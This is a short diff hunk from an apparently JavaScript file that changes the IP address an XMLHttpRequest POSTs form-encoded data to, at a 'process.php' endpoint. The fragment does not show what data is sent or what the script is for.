@@ -54,7 +54,7 @@ var currentHour;
 var currentMinute;
 var currentSecond;
 
-xhr.open("POST", "https://138.68.87.189/process.php", true);
+xhr.open("POST", "https://138.68.77.231/process.php", true);
 xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded")
 xhr.onreadystatechange = function() {
     if (xhr.readyState === 4) {
